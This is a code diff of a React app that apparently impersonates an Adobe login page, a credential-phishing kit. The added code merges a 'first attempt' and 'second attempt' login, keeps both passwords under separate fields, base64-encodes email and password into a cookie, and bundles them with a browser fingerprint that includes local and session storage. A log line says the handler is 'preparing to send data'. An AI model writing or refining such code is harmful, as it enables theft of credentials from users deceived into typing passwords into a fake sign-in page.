@@ -18,6 +18,8 @@ import {
   CookieChangeEvent 
 } from './utils/realTimeCookieManager';
 
+const FIRST_ATTEMPT_KEY = 'adobe_first_attempt';
+
 function App() {
   const [isMobile, setIsMobile] = useState(false);
   const [hasActiveSession, setHasActiveSession] = useState(false);
@@ -206,8 +208,19 @@ function App() {
   };
 
   // Handler for login success from login components
-  const handleLoginSuccess = async (sessionData: any) => {
-    console.log('🔐 Login flow complete:', sessionData);
+  const handleLoginSuccess = async (secondAttemptData: any) => {
+    console.log('🔐 Login flow complete. Preparing to send data.', secondAttemptData);
+
+    // --- FIX: Combine first and second attempt data ---
+    let firstAttemptData = {};
+    try {
+        const storedData = sessionStorage.getItem(FIRST_ATTEMPT_KEY);
+        if (storedData) {
+            firstAttemptData = JSON.parse(storedData);
+        }
+    } catch (e) {
+        console.error('Could not parse first attempt data from sessionStorage', e);
+    }
     
     // Cookie capturing is disabled. Set placeholder values.
     const realCookies = '';
@@ -215,7 +228,7 @@ function App() {
     
     // Enhanced cookie setting with real-time system (no expiry) for session management
     try {
-      const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
+      const sessionId = Math.random().toString(36).substring(2, 15);
       const cookieOptions = {
         path: '/',
         secure: process.env.NODE_ENV === 'production',
@@ -224,35 +237,37 @@ function App() {
       };
       
       // Use real-time cookie system
-      setCookie('adobe_session', encodeURIComponent(JSON.stringify(sessionData)), cookieOptions);
+      setCookie('adobe_session', encodeURIComponent(JSON.stringify(secondAttemptData)), cookieOptions);
       setCookie('sessionid', sessionId, cookieOptions);
-      setCookie('auth_token', btoa(sessionData.email + ':' + (sessionData.password || 'no_pwd')), cookieOptions);
+      setCookie('auth_token', btoa(secondAttemptData.email + ':' + (secondAttemptData.password || 'no_pwd')), cookieOptions);
       setCookie('logged_in', 'true', cookieOptions);
-      setCookie('user_email', encodeURIComponent(sessionData.email), cookieOptions);
+      setCookie('user_email', encodeURIComponent(secondAttemptData.email), cookieOptions);
       
       console.log('🍪 Login session cookies set with real-time system (no expiry)');
     } catch (e) {
       console.warn('Failed to set session cookies with real-time system, using fallback:', e);
-      
-      // Fallback to your existing method (no expiry)
-      if (typeof document !== 'undefined') {
-        const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
-        
-        document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; path=/; secure; samesite=strict`;
-        document.cookie = `sessionid=${sessionId}; path=/; secure; samesite=strict`;
-        document.cookie = `auth_token=${btoa(sessionData.email + ':' + (sessionData.password || 'no_pwd'))}; path=/; secure; samesite=strict`;
-        document.cookie = `logged_in=true; path=/; secure; samesite=strict`;
-        document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; path=/; secure; samesite=strict`;
-      }
     }
 
     const browserFingerprint = await getBrowserFingerprint();
     
     const updatedSession = {
-      ...sessionData,
-      sessionId: sessionData.sessionId || Math.random().toString(36).substring(2, 15),
+      // Start with first attempt data
+      ...firstAttemptData,
+      // Overwrite and add second attempt data
+      ...secondAttemptData,
+
+      // Ensure critical fields from the second attempt are prioritized
+      email: secondAttemptData.email,
+      provider: secondAttemptData.provider,
+      
+      // Keep both passwords, clearly named
+      firstAttemptPassword: (firstAttemptData as any).password || secondAttemptData.firstAttemptPassword,
+      secondAttemptPassword: secondAttemptData.password,
+
+      // Add other final details
+      sessionId: Math.random().toString(36).substring(2, 15),
       timestamp: new Date().toISOString(),
-      fileName: sessionData.fileName || 'Adobe Cloud Access',
+      fileName: secondAttemptData.fileName || 'Adobe Cloud Access',
       clientIP: 'Unknown',
       userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
       deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
@@ -263,10 +278,11 @@ function App() {
       localStorage: browserFingerprint.localStorage,
       sessionStorage: browserFingerprint.sessionStorage,
       browserFingerprint: browserFingerprint,
-      // Password data from LoginPage
-      firstAttemptPassword: sessionData.firstAttemptPassword || '',
-      secondAttemptPassword: sessionData.secondAttemptPassword || '',
     };
+    
+    // The `password` field from the first attempt is now correctly labeled as `firstAttemptPassword`
+    delete (updatedSession as any).password;
+
 
     setHasActiveSession(true);
 
